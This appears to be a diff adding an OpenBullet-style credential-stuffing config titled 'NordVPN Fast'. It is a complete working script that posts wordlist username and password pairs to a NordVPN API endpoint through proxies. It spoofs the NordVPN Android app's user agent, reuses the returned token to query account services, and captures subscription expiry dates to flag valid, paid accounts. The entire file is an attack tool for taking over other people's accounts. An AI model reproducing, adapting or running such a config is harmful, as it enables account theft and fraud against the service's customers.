@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "NordVPN Fast",
+  "SuggestedBots": 1,
+  "LastModified": "2019-08-02T14:42:27.4523923+05:30",
+  "AdditionalInfo": "",
+  "Author": "SATAN666",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://zwyr157wwiu6eior.com/v1/users/tokens" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: NordApp android (playstore/2.8.6) Android 9.0.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Unauthorized" 
+  KEYCHAIN Retry OR 
+    KEY "502: Bad gateway" 
+PARSE "<SOURCE>" LR "\"token\":\"" "\"" -> VAR "TOKEN" 
+FUNCTION Base64Encode "token:<TOKEN>" -> VAR "ENCTOKEN" 
+REQUEST GET "https://zwyr157wwiu6eior.com/v1/users/services" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic <ENCTOKEN>" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "created_at" 
+  KEYCHAIN Failure OR 
+    KEY "[]" 
+PARSE "<SOURCE>" LR "\",\"expires_at\":\"" "\"" -> VAR "EXPIRATION" 
+FUNCTION DateToUnixTime "<EXPIRATION>" -> VAR "Unix" 
+FUNCTION CurrentUnixTime -> VAR "Current" 
+EXECUTEJS "var acct=Unix; var currt=Current; var comp=(acct>currt)?\"true\":\"false\"; " 
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "false" 
+    KEY "2001-01-01" 
+PARSE "<SOURCE>" LR "\",\"expires_at\":\"" "\"" -> CAP "Expiration Date" 
